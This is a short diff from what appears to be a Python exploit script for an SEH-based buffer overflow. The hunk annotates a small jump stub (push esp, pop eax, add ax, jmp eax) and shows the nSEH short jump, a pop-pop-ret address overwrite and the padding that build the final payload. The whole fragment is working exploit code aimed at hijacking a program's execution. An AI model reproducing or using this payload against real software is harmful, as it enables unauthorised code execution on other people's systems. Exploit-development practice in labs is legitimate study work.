@@ -46,7 +46,10 @@ nseh = "\xeb\x06\x90\x90"
 # pop pop ret at 0x625011b3
 # seh = "\x43" * 4
 seh = struct.pack('<I',0x625011b3)
-boop = "\x54\x58\x66\x05\xf0\x03\xff\xe0"
+boop = "\x54" #push esp
+boop += "\x58" # pop eax
+boop += "\x66\x05\xf0\x03" # add ax,3f0
+boop += "\xff\xe0" # jmp eax
 morejunk = "\x44" * (total - totalbuffer - len(nseh) - len(nseh) -len(boop))
 
 payload = header + buffer + nseh + seh + boop + morejunk
